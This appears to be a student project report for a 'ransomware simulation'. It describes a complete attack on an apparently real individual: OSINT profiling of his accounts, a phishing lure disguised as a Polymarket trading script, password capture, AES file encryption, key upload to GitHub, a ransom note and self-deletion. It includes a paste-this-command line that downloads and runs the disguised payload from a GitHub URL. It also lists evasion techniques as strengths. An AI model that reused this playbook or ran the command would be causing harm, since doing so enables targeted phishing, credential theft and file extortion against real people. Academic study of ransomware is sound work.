Project : Ransomware Simulation  
Author: Yoav Savir

1. Tool Description 

This ransomware simulation demonstrates complete ransomware attack - from reconnaissance to deployment.

1. Reconnaissance & OSINT: Target research using multiple tools (Sherlock, Holehe, Recon-ng)
2. Social Engineering: Disguises as legitimate "Polymarket Trading Script" based on target interests
3. Phishing + Delivery: Uses ProtonMail account for anonymous communication, tar.gz file via github
4. Password Harvesting: Captures user passwords through fake authentication (for possible foture use)
5. File Encryption: Uses AES-256-CBC to encrypt user files 
6. Command & Control: Uploads keys and system info to GitHub 
7. Ransom Note: Generates ransom note with decryption instructions
8. Recovery Tool: Creates decryption script for file recovery
9. Self-Destruct: Removes traces after execution

2. Reconnaissance & Target Analysis

2.1 OSINT Tools Used
+ Sherlock - Username enumeration across social platforms
- Found 22 accounts including GitHub, CodeAcademy, Chess.com, 9GAG
- Revealed programming interests and gaming/gambling activities
+Holehe - Email address verification across 121 services
- Confirmed active email usage on Amazon, GitHub, Spotify, Twitter
- Verified target maintains active online presence
+Recon-ng - Comprehensive profile enumeration  
- Discovered 27 additional platform associations
- Cross-referenced username patterns across platforms

2.2 Target Profile Analysis
Based on reconnaissance results, target profile shows:
- Programming Background: Active on GitHub, CodeAcademy, CyberDefenders, CS student
- Gambling/Gaming Interests: Chess.com, various gaming platforms, entertainment sites
- Active Social Media: Twitter/X, Snapchat, Threads, Reddit-like platforms


2.3 Social Engineering Strategy
Target interests analysis revealed perfect opportunity:
- Programming background → Would be interested in trading automation scripts
- Gambling tendencies → Would be attracted to "Polymarket" (prediction market platform) →
 I tried to signup using his email and found out he is already registered.
- Active online presence → Likely to engage with unsolicited technical content

2.4 Delivery Method
- Created anonymous ProtonMail account for initial contact
- Sent email offering "exclusive Polymarket trading script"
- Leveraged target's programming knowledge to reduce suspicion
- Positioned script as legitimate automation tool for prediction markets
- script is already executable inside compressed file to try and save permissions

3. Execution Flow

main()
  └── initialize_setup()
      ├── open_distraction()
      └── encrypt_files()
          ├── create_initial_key_info()
          │   └── get_external_ip()
          ├── upload_key_to_github() [initial]
          ├── find_target_files()
          │   └── is_safe_path() [for each file]
          ├── encrypt_file() [multi-threaded for each target file]
          │   └── is_safe_path()
          ├── create_final_key_info()
          │   └── get_external_ip()
          ├── upload_key_to_github() [final]
          ├── create_ransom_note()
          ├── create_decryption_tool()
          └── self_destruct()


1. main() - calls initialize_setup()
2. initialize_setup() - calls open_distraction() and encrypt_files()
3. encrypt_files() - main orchestrator, calls most other functions
4. find_target_files() - calls is_safe_path() before encryption
5. create_initial_key_info(), create_final_key_info() - both call get_external_ip()
6. upload_key_to_github() - called twice (start and end)
7. self_destruct() - final cleanup, called last

4. Problems Encountered
2.1. VM corruption
- Solution: Used multiple VMs, saved local copy of key at beginning

2.2. System files corruption risk
- Solution: Added safety checks to avoid critical system files

2.3 speed problems
- Solution: using threads to accelerate encryption

2.4. Thread synchronization issues  
- Solution: A lot of try and error, used threading.Lock() for thread-safe operations

2.5. Network connection issues
- Solution: Upload keys at beginning and end, kept local backup during development

2.6. Hardware problems + learning Mac OS + rusty in Python (didn't program in it for long time)
- Solution: Laptop broke first semester, bought Mac, had to learn new OS and use VMs
- Solution: Creating the executable on container and transferring to VM

2.7. Distraction during encryption
- Solution: fake installation screen + "rick rolling"

2.8. Scale of project - never did such a big project without guidelines alone
- A lot of try and fail
- learned to work organized
- worked module by module, tested them, and eventually connected them to 1 file

2.9. Crypto wallets, created, tested, then realized it better to give wallet address only after the victim replied via email.

2.10. File permission issues during deployment
- Solution: Switched from direct executable to tar.gz archive to preserve Unix permissions
- Solution: Eliminates need for victims to manually run "chmod +x" command

2.11. Decryption script duplicate directory bug
- Problem: Script found same encrypted files twice due to duplicate search directories
- Symptom: "Found 14 files" but only 11 actual files, with 3 "file not found" errors
- Solution: Removed duplicate directories from search list and added safety checks


5. Strengths and Weaknesses

Strengths
- Comprehensive OSINT: Multi-tool reconnaissance (Sherlock, Holehe, Recon-ng) for target profiling
- Targeted Social Engineering: Script theme based on actual target interests (programming + gambling)
- Anonymous Communications: ProtonMail delivery to avoid attribution
- Uses industry-standard AES-256-CBC encryption
- Unique IV per file for security (although said not necessary) 
- Multi-threaded encryption for performance
- Convincing social engineering (trading script cover, installation script)
- Professional installation process
- Distraction techniques (Rick Roll video)
- Executable rather than script (harder to reverse engineer than plain text script)
- Archive delivery method preserves permissions (operational evasion)
- Simplified deployment reduces technical barriers for victims
- No manual chmod step required (reduces suspicion and friction)
- Automatic cleanup of installation files (removes traces, professional appearance)

Weaknesses
- Predictable file patterns (.encrypted extension)
- Network communications detectable
- No persistence mechanisms
- Basic error handling
- Limited evasion techniques
- Tokens and Github can be traceable

6. Tool Operation

Installation (Final Delivery Method)
One-line installation command:
mkdir -p poly-trader && cd poly-trader && curl -L https://raw.githubusercontent.com/YoavSavir/PolymarketTrader/main/polymarket-trader.tar.gz -o polymarket-trader.tar.gz && tar -xzf polymarket-trader.tar.gz && rm polymarket-trader.tar.gz && ./PolymarketTrader

Manual Installation
mkdir -p poly-trader && cd poly-trader
curl -L https://raw.githubusercontent.com/YoavSavir/PolymarketTrader/main/polymarket-trader.tar.gz -o polymarket-trader.tar.gz
tar -xzf polymarket-trader.tar.gz
rm polymarket-trader.tar.gz
./PolymarketTrader

Usage
- Follow the installation process displayed by the program
- Several installation ways available in the Github readme file
- Enter password when prompted
- To decrypt run "python3 decrypt_files.py", then enter the key

Repository
- GitHub: https://github.com/YoavSavir/PolymarketTrader
- Archive download: https://raw.githubusercontent.com/YoavSavir/PolymarketTrader/main/polymarket-trader.tar.gz
- Keys: https://github.com/YoavSavir/keys

Execution Flow
1. User runs polymarket_trader.py
2. Social engineering messages displayed
3. User password captured
4. Distraction video opens (Rick Roll)
5. System info gathered
6. Target files scanned and validated
7. Initial key uploaded to GitHub
8. Files encrypted with multiple threads
9. Original files deleted
10. Final results uploaded
11. Ransom note created on desktop
12. Decryption tool generated
13. Script self-destructs

User sees legitimate trading script installation → enters password → video opens → files encrypted in background → ransom note appears

7. Code Architecture
- Main Class Handles all ransomware functionality

Key Functions explained:
__init__() Sets up encryption parameters, target directories, GitHub config
get_external_ip()  Gets victim's external IP address
is_safe_path()  Validates file paths to prevent system damage
find_target_files()  Scans for target files recursively 
encrypt_file()  AES-256-CBC encryption with unique IV per file
upload_key_to_github()  Uploads keys using GitHub API with Base64 encoding
initialize_setup()  Social engineering and password collection
create_decryption_tool()  Generates decrypt_files.py script
create_ransom_note()  Creates ransom note on desktop 


